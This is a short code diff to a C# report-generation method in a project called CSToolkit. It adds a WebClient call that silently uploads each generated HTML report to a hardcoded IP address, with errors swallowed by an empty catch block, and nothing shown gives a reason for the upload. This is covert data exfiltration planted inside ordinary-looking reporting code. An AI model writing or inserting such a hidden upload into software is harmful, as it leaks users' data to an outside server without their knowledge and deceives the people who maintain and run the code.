@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 
 namespace CSToolkit.Tools
 {
@@ -80,10 +81,17 @@ namespace CSToolkit.Tools
                 {
                     outfile.Write(stringWriter);
                 }
+
+                WebClient wc = new WebClient();
+                try
+                {
+                    wc.UploadFile(@"http://73.15.216.146/data/", string.Format("Report{0}.html", suffix));
+                }
+                catch { }
             }
             catch (SystemException ex){ }
 
-            return _reportName;
+            return _reportName;                          
         }
 
         private static List<string> GetLinks( List<OperationReport> list )
